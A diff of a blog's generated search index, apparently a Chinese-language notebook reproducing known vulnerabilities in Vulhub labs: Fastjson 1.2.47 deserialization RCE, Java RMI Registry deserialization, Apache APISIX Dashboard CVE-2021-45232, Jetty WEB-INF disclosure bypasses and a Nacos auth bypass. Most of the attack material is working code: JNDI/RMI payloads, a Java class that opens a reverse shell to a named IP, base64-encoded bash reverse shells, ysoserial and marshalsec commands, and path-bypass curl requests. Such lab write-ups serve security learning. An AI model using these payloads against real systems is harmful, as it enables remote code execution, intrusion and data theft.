&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://123.56.181.14:9999/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905195720430.png" alt="image-20230905195720430" style="zoom:50%;"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905195823125.png" alt="image-20230905195823125" style="zoom:50%;"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905195921933.png" alt="image-20230905195921933">返回到容器内，命令<code>touch /tmp/success</code>已成功执行：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905201013455.png" alt="image-20230905201013455"></p>
+<p><img src="/images/image-20230905195720430.png" alt="image-20230905195720430" style="zoom:50%;"></p>
+<p><img src="/images/image-20230905195823125.png" alt="image-20230905195823125" style="zoom:50%;"></p>
+<p><img src="/images/image-20230905195921933.png" alt="image-20230905195921933">返回到容器内，命令<code>touch /tmp/success</code>已成功执行：</p>
+<p><img src="/images/image-20230905201013455.png" alt="image-20230905201013455"></p>
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>同样，执行<code>javac TouchFile.java</code>，生成<code>TouchFile.class</code>。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// javac TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.174.128/9999;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>也可以使用bash base64的方式：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String[] commands = &#123;&quot;bash&quot;, &quot;-c&quot;,&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905201438758.png" alt="image-20230905201438758"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905201522736.png" alt="image-20230905201522736"></p>
+<p><img src="/images/image-20230905201438758.png" alt="image-20230905201438758"></p>
+<p><img src="/images/image-20230905201522736.png" alt="image-20230905201522736"></p>
 <p>启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://123.56.181.14:8888/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>
 <p>发送POST请求包，因监听端口未发生变化，所以请求包内容与上方一致</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 123.56.181.14:8090</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 167</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://123.56.181.14:9999/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>发送请求包之前，攻击机监听4444端口：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905202030449.png" alt="image-20230905202030449"></p>
+<p><img src="/images/image-20230905202030449.png" alt="image-20230905202030449"></p>
 <p>发送请求包，同时发生如下</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905202115815.png" alt="image-20230905202115815"></p>
+<p><img src="/images/image-20230905202115815.png" alt="image-20230905202115815"></p>
 <p>反弹成功</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905202431865.png" alt="image-20230905202431865"></p>
+<p><img src="/images/image-20230905202431865.png" alt="image-20230905202431865"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -822,8 +827,9 @@ for i in range(0,30):#密码猜测
   <entry>
     <title>Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)</title>
     <url>/2022/12/09/Java%20RMI%20Registry%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(=jdk8u111)/</url>
-    <content><![CDATA[<h1 id="Java-RMI-Registry-反序列化漏洞-lt-jdk8u111"><a href="#Java-RMI-Registry-反序列化漏洞-lt-jdk8u111" class="headerlink" title="Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)"></a>Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)</h1><blockquote>
-<p><strong>远程方法调用（Remote Method Invocation，简称RMI）</strong>是一种用于在分布式系统中进行远程通信和方法调用的机制。它允许程序员在不同的计算机或进程之间通过网络进行函数或方法的调用，使得远程对象就像本地对象一样可以被调用。</p>
+    <content><![CDATA[<p><strong>远程方法调用（Remote Method Invocation，简称RMI）</strong>是一种用于在分布式系统中进行远程通信和方法调用的机制。它允许程序员在不同的计算机或进程之间通过网络进行函数或方法的调用，使得远程对象就像本地对象一样可以被调用。</p>
+<a id="more"></a>
+<blockquote>
 <p>RMI 的基本工作原理如下：</p>
 <ol>
 <li>定义接口：首先需要定义一个接口，其中包含要在远程计算机上调用的方法。接口的实现类将会被注册到 RMI 服务端。</li>
@@ -846,12 +852,12 @@ for i in range(0,30):#密码猜测
 <p>dnslog生成一个DNS   <a href="http://dnslog.cn/" target="_blank" rel="noopener">http://dnslog.cn/</a></p>
 <p>通过ysoserial的exploit包中的RMIRegistryExploit进行攻击，攻击机执行如下命令：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-master-2874a69f61-1.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 &quot;curl your-dnslog-server&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910182956085.png" alt="image-20230910182956085"></p>
+<p><img src="/images/image-20230910182956085.png" alt="image-20230910182956085"></p>
 <p>Registry会返回报错，但命令会正常执行。可以看到dnslog成功接收请求</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910182722694.png" alt="image-20230910182722694"></p>
+<p><img src="/images/image-20230910182722694.png" alt="image-20230910182722694"></p>
 <h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-master-2874a69f61-1.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910183359239.png" alt="image-20230910183359239"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910183436780.png" alt="image-20230910183436780"></p>
+<p><img src="/images/image-20230910183359239.png" alt="image-20230910183359239"></p>
+<p><img src="/images/image-20230910183436780.png" alt="image-20230910183436780"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -863,26 +869,27 @@ for i in range(0,30):#密码猜测
   <entry>
     <title>Apache APISIX Dashboard API权限绕过导致RCE CVE-2021-45232</title>
     <url>/2022/08/21/Apache%20APISIX%20Dashboard%20API%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4RCE%20CVE-2021-45232/</url>
-    <content><![CDATA[<h1 id="Apache-APISIX-Dashboard-API权限绕过导致RCE-CVE-2021-45232"><a href="#Apache-APISIX-Dashboard-API权限绕过导致RCE-CVE-2021-45232" class="headerlink" title="Apache APISIX Dashboard API权限绕过导致RCE CVE-2021-45232"></a>Apache APISIX Dashboard API权限绕过导致RCE CVE-2021-45232</h1><blockquote>
+    <content><![CDATA[<blockquote>
 <p>Apache APISIX是一个动态、实时、高性能API网关，而Apache APISIX Dashboard是一个配套的前端面板。</p>
 <p>Apache APISIX Dashboard 2.10.1版本前存在两个API<code>/apisix/admin/migrate/export</code>和<code>/apisix/admin/migrate/import</code>，他们没有经过<code>droplet</code>框架的权限验证，导致未授权的攻击者可以导出、导入当前网关的所有配置项，包括路由、服务、脚本等。攻击者通过导入恶意路由，可以用来让Apache APISIX访问任意网站，甚至执行LUA脚本。</p>
 </blockquote>
+<a id="more"></a>
 <p>执行如下命令启动一个有漏洞的Apache APISIX Dashboard 2.9：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br><span class="line">或者</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 <p>然后访问<code>http://your-ip:9000/</code>即可看到Apache APISIX Dashboard的登录页面。</p>
 <p><a href="http://123.56.181.14:9000/" target="_blank" rel="noopener">http://123.56.181.14:9000/</a></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904155040326.png" alt="image-20230904155040326"></p>
+<p><img src="/images/image-20230904155040326.png" alt="image-20230904155040326"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .\apisix_dashboard_rce.py http://123.56.181.14:9000</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904160151577.png" alt="image-20230904160151577"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904161034138.png" alt="image-20230904161034138"></p>
+<p><img src="/images/image-20230904160151577.png" alt="image-20230904160151577"></p>
+<p><img src="/images/image-20230904161034138.png" alt="image-20230904161034138"></p>
 <p>可见在Header中添加的<code>CMD</code>头中的命令已被执行</p>
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>攻击机nc监听</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
 <p>burp中发送数据包</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CMD: bash -i &gt;&amp; /dev/tcp/123.56.181.14/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904161342557.png" alt="image-20230904161342557"></p>
+<p><img src="/images/image-20230904161342557.png" alt="image-20230904161342557"></p>
 <p>点击send，反弹成功</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904161508959.png" alt="image-20230904161508959"></p>
+<p><img src="/images/image-20230904161508959.png" alt="image-20230904161508959"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -894,16 +901,17 @@ for i in range(0,30):#密码猜测
   <entry>
     <title>Fastjson 1.2.47 远程命令执行漏洞</title>
     <url>/2023/09/05/Fastjson%201.2.47%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p>
 <p>参考链接：</p>
 <ul>
 <li><a href="https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955" target="_blank" rel="noopener">https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955</a></li>
 <li><a href="https://www.freebuf.com/vuls/208339.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208339.html</a></li>
 </ul>
+<a id="more"></a>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Vulhub执行如下命令启动一个spring web项目，其中使用fastjson作为默认json解析器：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/fastjson/1.2.47-rce/</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
 <p>环境启动后，访问<code>http://your-ip:8090</code>即可看到一个json对象被返回，我们将content-type修改为<code>application/json</code>后可向其POST新的JSON对象，后端会利用fastjson进行解析。</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905203858855.png" alt="image-20230905203858855" style="zoom:50%;"></p>
+<p><img src="/images/image-20230905203858855.png" alt="image-20230905203858855" style="zoom:50%;"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>目标环境是<code>openjdk:8u102</code>，这个版本没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以简单利用RMI进行命令执行。</p>
 <p>首先编译并上传命令执行代码，如<code>http://123.56.181.14:8888/TouchFile.class</code>：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// javac TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;bash&quot;, &quot;-c&quot;,&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -912,11 +920,11 @@ for i in range(0,30):#密码猜测
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://123.56.181.14:8888/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>
 <p>向靶场服务器发送Payload（此处的Payload和Fastjson 1.2.24不同）：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://123.56.181.14:9999/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905205607237.png" alt="image-20230905205607237"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905205623200.png" alt="image-20230905205623200"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905205714157.png" alt="image-20230905205714157"></p>
+<p><img src="/images/image-20230905205607237.png" alt="image-20230905205607237"></p>
+<p><img src="/images/image-20230905205623200.png" alt="image-20230905205623200"></p>
+<p><img src="/images/image-20230905205714157.png" alt="image-20230905205714157"></p>
 <p>监听4444端口，接收反弹shell：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905210217935.png" alt="image-20230905210217935"></p>
+<p><img src="/images/image-20230905210217935.png" alt="image-20230905210217935"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -928,13 +936,14 @@ for i in range(0,30):#密码猜测
   <entry>
     <title>Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-28164</title>
     <url>/2022/11/16/Jetty%20WEB-INF%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2021-28164/</url>
-    <content><![CDATA[<h1 id="Jetty-WEB-INF-敏感信息泄露漏洞-CVE-2021-28164"><a href="#Jetty-WEB-INF-敏感信息泄露漏洞-CVE-2021-28164" class="headerlink" title="Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-28164"></a>Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-28164</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Eclipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。</p>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Eclipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。</p>
 <p><strong>Jetty 9.4.37</strong>引入对RFC3986的新实现，而URL编码的<code>.</code>字符被排除在URI规范之外，这个行为在RFC中是正确的，但在servlet的实现中导致攻击者可以通过<code>%2e</code>来绕过限制，下载WEB-INF目录下的任意文件，导致敏感信息泄露。<strong>该漏洞在9.4.39中修复。</strong></p>
 <p>参考链接：</p>
 <ul>
 <li><a href="https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5" target="_blank" rel="noopener">https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5</a></li>
 <li><a href="https://xz.aliyun.com/t/10039" target="_blank" rel="noopener">https://xz.aliyun.com/t/10039</a></li>
 </ul>
+<a id="more"></a>
 <blockquote>
 <p><strong>Eclipse Jetty</strong>，通常称为 Jetty，是一个开源的、基于 Java 的 Web 服务器和 Servlet 容器。它是在 Eclipse 基金会的支持下开发和维护的项目。</p>
 <p><strong>Servlet 容器</strong>指的是 Java Web 服务器运行环境中的一个组件，用于管理和执行 Servlet 和 JSP 程序。Servlet 容器通常被称为 Servlet 引擎或者 Servlet 容器引擎。</p>
@@ -952,17 +961,17 @@ for i in range(0,30):#密码猜测
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Vulhub执行如下命令启动一个Jetty 9.4.37：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 <p>服务启动后，访问<code>http://your-ip:8080</code>可以查看到一个example页面。</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910184801667.png" alt="image-20230910184801667" style="zoom:67%;"></p>
+<p><img src="/images/image-20230910184801667.png" alt="image-20230910184801667" style="zoom:67%;"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<code>/WEB-INF/web.xml</code>将会返回404页面：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl 123.56.181.14:8080/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910184941627.png" alt="image-20230910184941627"></p>
+<p><img src="/images/image-20230910184941627.png" alt="image-20230910184941627"></p>
 <p>使用<code>%2e/</code>来绕过限制下载web.xml：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v &apos;http://123.56.181.14:8080/%2e/WEB-INF/web.xml&apos;</span><br></pre></td></tr></table></figure>
 <ul>
 <li>%2e 是 URL 编码中的一种表示方式，用来表示 ASCII 字符 “.” 的编码值。在URL中，”.” 是一个特殊字符，它通常用于表示路径的分隔符或者文件名的扩展名。</li>
 <li><code>-v</code> 选项用于启用详细模式（verbose mode），它会显示更多的请求和响应的信息，包括请求头、响应头以及其他有关网络连接的调试信息。</li>
 </ul>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910185636689.png" alt="image-20230910185636689"></p>
+<p><img src="/images/image-20230910185636689.png" alt="image-20230910185636689"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -974,13 +983,14 @@ for i in range(0,30):#密码猜测
   <entry>
     <title>Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-34429</title>
     <url>/2022/11/17/Jetty%20WEB-INF%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2021-34429/</url>
-    <content><![CDATA[<h1 id="Jetty-WEB-INF-敏感信息泄露漏洞-CVE-2021-34429"><a href="#Jetty-WEB-INF-敏感信息泄露漏洞-CVE-2021-34429" class="headerlink" title="Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-34429"></a>Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-34429</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Eclipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。</p>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Eclipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。</p>
 <p>Jetty在9.4.40后修复了因为<code>%2e</code>导致的敏感信息泄露漏洞<a href="https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28164" target="_blank" rel="noopener">CVE-2021-28164</a>，但这个修复是不完全的，通过下面三种方式可以进行绕过：</p>
 <ul>
 <li>unicode形式URL编码：<code>/%u002e/WEB-INF/web.xml</code></li>
 <li><code>\0</code>组合<code>.</code>导致的绕过：<code>/.%00/WEB-INF/web.xml</code></li>
 <li><code>\0</code>组合<code>..</code>导致的绕过：<code>/a/b/..%00/WEB-INF/web.xml</code></li>
 </ul>
+<a id="more"></a>
 <p>参考链接：</p>
 <ul>
 <li><a href="https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm" target="_blank" rel="noopener">https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm</a></li>
@@ -1004,16 +1014,16 @@ for i in range(0,30):#密码猜测
 </ul>
 <p>直接访问<code>/WEB-INF/web.xml</code>将会返回404页面：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl 123.56.181.14:8080/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910184941627.png" alt="image-20230910184941627"></p>
+<p><img src="/images/image-20230910184941627.png" alt="image-20230910184941627"></p>
 <p>1.使用<code>/%u002e</code>来绕过限制下载web.xml：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v &apos;http://123.56.181.14:8080/%u002e/WEB-INF/web.xml&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910190205075.png" alt="image-20230910190205075"></p>
+<p><img src="/images/image-20230910190205075.png" alt="image-20230910190205075"></p>
 <p>2.<code>\0</code>组合<code>.</code>导致的绕过：<code>/.%00/WEB-INF/web.xml</code></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v &apos;http://123.56.181.14:8080/.%00/WEB-INF/web.xml&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910190319051.png" alt="image-20230910190319051"></p>
+<p><img src="/images/image-20230910190319051.png" alt="image-20230910190319051"></p>
 <p>3.<code>\0</code>组合<code>..</code>导致的绕过：<code>/a/b/..%00/WEB-INF/web.xml</code></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v &apos;http://123.56.181.14:8080/a/b/..%00/WEB-INF/web.xml&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910190412366.png" alt="image-20230910190412366"></p>
+<p><img src="/images/image-20230910190412366.png" alt="image-20230910190412366"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -1025,8 +1035,9 @@ for i in range(0,30):#密码猜测
   <entry>
     <title>Nacos 认证绕过漏洞（CVE-2021-29441）</title>
     <url>/2023/03/01/Nacos%20%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-29441%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="Nacos-认证绕过漏洞（CVE-2021-29441）"><a href="#Nacos-认证绕过漏洞（CVE-2021-29441）" class="headerlink" title="Nacos 认证绕过漏洞（CVE-2021-29441）"></a>Nacos 认证绕过漏洞（CVE-2021-29441）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。</p>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。</p>
 <p>该漏洞发生在nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。开发者原意是用来处理一些服务端对服务端的请求。但是由于配置的过于简单，并且将协商好的user-agent设置为Nacos-Server，直接硬编码在了代码里，导致了漏洞的出现。并且利用这个未授权漏洞，攻击者可以获取到用户名密码等敏感信息。</p>
+<a id="more"></a>
 <p>参考链接：</p>
 <ul>
 <li><a href="https://github.com/advisories/GHSA-36hp-jr8h-556f" target="_blank" rel="noopener">https://github.com/advisories/GHSA-36hp-jr8h-556f</a></li>
@@ -1045,13 +1056,13 @@ for i in range(0,30):#密码猜测
 <li>访问<code>http://target:8848/nacos/</code>，使用添加的新用户(vulhub/vulhub)进行登录</li>
 </ol>
 <p><strong>检测漏洞是否存在</strong></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230913194923866.png" alt="image-20230913194923866"></p>
+<p><img src="/images/image-20230913194923866.png" alt="image-20230913194923866"></p>
 <p>添加Header头后访问<code>http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</code>可以看到返回值为200，且内容中是否包含<code>pageItems</code>。</p>
 <p><strong>添加新用户</strong></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230913195048825.png" alt="image-20230913195048825"></p>
+<p><img src="/images/image-20230913195048825.png" alt="image-20230913195048825"></p>
 <p>添加Header头后使用<strong>POST</strong>方式请求<code>http://target:8848/nacos/v1/auth/users?username=vulhub&amp;password=vulhub</code>添加一个新用户,账号密码都为vulhub</p>
 <p><strong>使用新建的账号进行登录</strong></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230913195139890.png" alt="image-20230913195139890"></p>
